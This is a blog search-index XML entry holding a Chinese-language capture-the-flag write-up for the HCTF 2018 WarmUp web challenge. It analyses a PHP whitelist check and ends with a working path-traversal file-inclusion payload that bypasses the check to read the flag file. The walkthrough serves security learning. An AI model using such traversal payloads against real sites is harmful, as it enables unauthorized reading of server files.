<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HCTF2018-WarmUp-1</title>
    <link href="/2023/04/24/HCTF2018-WarmUp-1/"/>
    <url>/2023/04/24/HCTF2018-WarmUp-1/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF-2018WarmUp-1"><a href="#HCTF-2018WarmUp-1" class="headerlink" title="HCTF 2018WarmUp-1"></a>HCTF 2018WarmUp-1</h1><p>打开靶场，看到一个滑稽表情</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314816823.png" alt="1682314816823" style="zoom:80%;"><p>F12查看，发现存在source.php文件</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314829956.png" alt="1682314829956" style="zoom:80%;"><p>找到源代码，对这段php进行分析</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314881013.png" alt="1682314881013" style="zoom:80%;"><p>首先分析最后一段的三个条件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>这三个条件都为true才能进入include函数，文件包含处flag文件，前两个条件为判断是否为空和字符串，主要看第三个<br>    <span class="hljs-keyword">if</span> (! empty(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-regexp">//</span>判断是否为空<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-regexp">//</span>判断是否为字符串<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])   <span class="hljs-regexp">//</span>验证checkFile的条件是否成立<br>    ) &#123;<br>        include <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br>?&gt;<br></code></pre></td></tr></table></figure><p>对checkFile函数进行分析</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定义白名单，键source的值source.php，键hint的值hint.php<br><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br></code></pre></td></tr></table></figure><p>对第一个条件进行分析</p><pre><code class="hljs">//判断传入的page也就是最后面三个条件中的变量file是否设置或者是否为字符串if (! isset($page) || !is_string($page)) &#123;            echo &quot;you can&#39;t see it&quot;;            return false;&#125;</code></pre><p>对第二个条件进行分析</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">//判断<span class="hljs-keyword">file</span>的值是否在白名单中，如果在才会返回<span class="hljs-literal">true</span><br>if (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>第三段是创建一个page变量，对这个值进行截取开头到mb_strpos($page . ‘?’, ‘?’)结束的位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-regexp">//</span>最后的值为page中第一个?之前的内容<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p>判断$是否在白名单中</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>对page进行URL解码后将值重新赋值给page，然后再次截取，截取后再次赋值给page</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_page = urldecode($page)<span class="hljs-comment">;</span><br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>判断此时的page是否在白名单中</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-attribute">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br></code></pre></td></tr></table></figure><p>如果没有进入if语句就会  “you can’t see it” 然后返回flase </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br><br></code></pre></td></tr></table></figure><p>经过代码审计，可以看出需要让checkFile为真的前提下来构造payload用于包含 ffffllllaaaagggg  文件。第二个if判断了文件名，则file只能为source.php或者hint.php</p><p>查看hint.php文件，通过暗示构造payload</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314805774.png" alt="1682314805774" style="zoom:80%;"><p>flag被写了四次，可以尝试跨越四层目录去找这个文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">payload：<span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg<br><br></code></pre></td></tr></table></figure><p>成功找到flag</p><img src="/2023/04/24/HCTF2018-WarmUp-1/1682314769365.png" alt="1682314769365" style="zoom:80%;">]]></content>
    
    
    
    <tags>
      
      <tag>CTF-WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
